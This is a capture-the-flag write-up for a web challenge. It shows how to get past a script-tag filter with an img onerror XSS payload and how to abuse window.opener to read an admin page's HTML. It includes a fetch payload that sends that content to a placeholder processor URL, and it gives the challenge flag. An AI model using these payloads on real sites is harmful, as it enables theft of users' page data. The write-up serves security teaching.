# IRS Internal CTF: Web

## Xtreme Static Sites (sheepymeh) [250 Points]

**[This website](http://irscybersec.tk:10782/) seems pretty cool, but I don't trust it. The page tells us that the admin panel is very simple, but I don't believe them. Can you find out the true `innerHTML` of the admin panel?**

### Solution

The title points us to an XSS:

```html
<script>alert(1)</script>
```

Ah snap. It blocks `<script>` tags, but we know [we can use other tags to XSS it easily](https://owasp.org/www-community/xss-filter-evasion-cheatsheet):

```html
<img src='fail' onerror='alert(1)'>
```

First filter passed. Now, we need to get the information we need. If you perform a normal XSS and exfiltrate the cookie, you'll soon come to the realization that this challenge is worth more than 5 points.

Looking at the source code provided, we can see that the admin is clicking on a link, generated by the JavaScript:

```html
<a href="/user/yoursite.html" target="_blank">Click here for the reported link</a>
```

Doesn't seem too suspicious.

This is where the OSINT/staying up to date comes in. [This vulnerability has been known for quite some time](https://web.dev/external-anchors-use-rel-noopener/), and is indeed rather dangerous (yet quite a few courses still explain `target="_blank"` without proper mitigation). Using this vulnerability, an attacker can access information about the site that opened it using the `window.opener` variable.

Unfortunately, this does not work cross-domain. If I open a website on `google.com` from `facebook.com`, `window.opener` will be empty. The variable is only available on the same domain name.

Fortunately, the server allows us to server JavaScript on their domain, directly. How nice! A special XSS payload can hence be crafted:

```html
<img src='fail' onerror="fetch(`<processor_url>?data=${encodeURIComponent(window.opener.document.body.innerHTML)}`)">
```

The processor script should store the `data` parameter.

A quick explanation on what this does:

| Code                      | Description                                                  |
| ------------------------- | ------------------------------------------------------------ |
| `fetch`                   | Send a `GET` request                                         |
| `encodeURIComponent`      | Make the request valid                                       |
| `window.opener`           | As mentioned above. The `window` object of the opener. This can be used in the same way as `window` on the page itself as our page is on the same domain as the admin page. |
| `document.body.innerHTML` | The `innerHTML`, i.e. source code of the page.               |

### Remarks

* It is imperative that you know that `window.opener` includes the `document` object.
* `window.open()` also causes the variable to be set.

### Flag

```
IRS{R3M3MB3R_7H3_N00P3N3R}
```